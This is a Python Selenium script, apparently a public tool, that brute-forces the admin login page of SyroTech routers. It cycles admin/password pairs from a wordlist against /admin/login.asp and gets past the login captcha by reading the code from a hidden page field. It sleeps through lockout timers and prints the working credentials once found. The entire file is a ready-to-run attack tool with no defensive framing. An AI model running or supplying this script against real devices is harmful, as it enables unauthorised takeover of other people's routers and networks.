#!/usr/bin/python3
# -*- coding: utf-8 -*-
from selenium import webdriver
import argparse
import time
import os


class BruteForce(object):

    start = time.time()

    def __init__(self, bin, V):
        if not bin:
            options = webdriver.ChromeOptions()
            if not V:
                options.add_argument('headless')
            self.browser = webdriver.Chrome(options=options)
            print("> Lauching Chrome [✔]")
        else:
            options = webdriver.FirefoxOptions()
            if not V:
                options.add_argument('headless')
            self.browser = webdriver.Firefox(options=options)
            print("> Lauching Firefox [✔]")

    def get(self, page):
        self.browser.get(page)

    def solve_cap(self):
        try:
            return self.browser.find_element_by_id("check_code").get_attribute("value")
        except Exception:
            try:
                t = self.browser.find_element_by_id("timer").text
                print(f"Encountered 404 Sleeping for {t}s [!]")
                time.sleep(int(t)+5)
                return self.browser.find_element_by_id("check_code").get_attribute("value")
            except Exception:
                print("Either the site is not responding or does not exist")
                exit()

    def fill_forms(self, admin, password, cap):
        self.browser.find_element_by_id("username1").send_keys(admin)
        self.browser.find_element_by_id("psd1").send_keys(password)
        self.browser.find_element_by_id("verification_code").send_keys(cap)
        self.browser.find_element_by_xpath("//input[@value=' Login']").click()

    def is_error(self):
        try:
            h4 = self.browser.find_element_by_tag_name("h4")
            if "wrong password" in h4.text or "3 consecutive times" in h4.text:
                return True
            else:
                return False
        except Exception:
            return False

    @staticmethod
    def wordlist_parser(wordlist):
        with open(wordlist, "rt") as word:
            for lines in word.readlines():
                x, y = lines.replace("\n", "").split("/", 1)
                yield (x, y)


def main():
    parser = argparse.ArgumentParser(
        description='BruteForce SyroTech admin page', epilog='By AlenPaulVarghese', prog="SyroTech-AdminPage-BruteForcer")
    parser.add_argument('list', help="passwordlist where each line is in admin/password format", type=str)
    parser.add_argument('-l', '--link', help="ip addr of the site defaul value https://192.168.1.1", default='http://192.168.1.1', metavar="")
    parser.add_argument('-V', '--verbose', action="store_true", help="run selenium without headless")
    parser.add_argument('-F', '--firefox', action="store_true", help="pass -F to use firefox geckodriver")
    options = parser.parse_args()
    if not os.path.isfile(options.list):
        print(f"File not found --> {options.list}")
        return
    print("> Wordlist Found [✔]")
    brute = BruteForce(options.firefox, options.verbose)
    for x, y in BruteForce.wordlist_parser(options.list):
        brute.get(options.link+"/admin/login.asp")
        cap = brute.solve_cap()
        print(f"Trying {x}/{y} [?]", end=" - ")
        brute.fill_forms(x, y, cap)
        if brute.is_error():
            print("X")
        else:
            print(f"Found Credentials : {x}/{y} [✔]")
            break


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
